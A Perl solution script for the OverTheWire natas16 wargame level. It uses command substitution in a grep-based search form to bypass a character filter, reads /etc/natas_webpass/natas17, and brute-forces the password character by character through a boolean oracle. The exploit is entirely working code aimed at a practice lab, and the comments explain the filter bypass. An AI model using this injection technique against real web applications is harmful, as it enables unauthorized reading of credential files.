#!/bin/perl
use LWP::Simple;
use HTML::Parse;
use URI;
use v5.10;

my $user = 'natas16';
my $login = shift or die "Please provide the password as argument\n";
my $host = $user.'.natas.labs.overthewire.org';
my $uri = URI->new(sprintf("http://%s:%s@%s", $user, $login, $host));

# This is similiar to natas16, but we will have to do a little more sophisticated attack
# Here, the characters ; | & ` ' " are forbidden.
# The input is also properl quoted, so we can't comment out the rest of the line
# Backticks are forbidden. However, we can use command substitution using $() which is more readable anyways.
# This is probably the most standard solution
# It works basically the same way as natas15, but the boolean injection isn't based on SQL
my $command = '$(grep ^%s /etc/natas_webpass/natas17)musicians';
my $password = '';
my @chars = (a..z, A..Z, 0..9);
my $position = 0;
OUTER: while(1) {
  # Disable buffering for carriage return to print in STDOUT
  local $|=1;
  INNER: foreach my $ch (@chars) {
    print "\rDetermining password: $password$ch";
    $uri->query_form( needle => sprintf( $command, $password.$ch ));
    my $result = parse_html( get( $uri ) )->format;
    # This means we have not found the char
    # Jump to the next iteration
    next INNER if ($result =~ /musicians/);
    # We only reach this part of code when we found a correct characters
    # Iterate over the next position
    $password .= $ch;
    next OUTER;
  }
  # We only reach this part if none of the characters were correct
  # That means, we found the complete password
  # Exit loop
  last OUTER;
}
say "\rThe password for natas17 is $password";
